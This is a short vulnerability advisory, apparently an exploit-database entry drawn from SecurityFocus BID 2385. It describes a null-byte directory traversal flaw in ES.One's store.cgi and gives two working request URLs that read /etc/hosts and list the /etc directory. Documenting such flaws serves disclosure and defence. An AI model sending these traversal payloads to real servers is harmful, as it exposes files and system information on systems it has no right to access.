@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/2385/info
+
+It is possible for a remote user to gain read access to directories and files outside the root directory of ES.One. Requesting a specially crafted URL by way of 'store.cgi', composed of '/../' sequences and appended with '%00' will disclose an arbitrary directory. 
+
+http://target/cgi-bin/store.cgi?StartID=../etc/hosts%00.html
+
+^^ = Will obviously open the hosts file.
+
+http://target/cgi-bin/store.cgi?StartID=../etc/%00.html
+
+^^ = Will obviously list the /etc/ directory. 
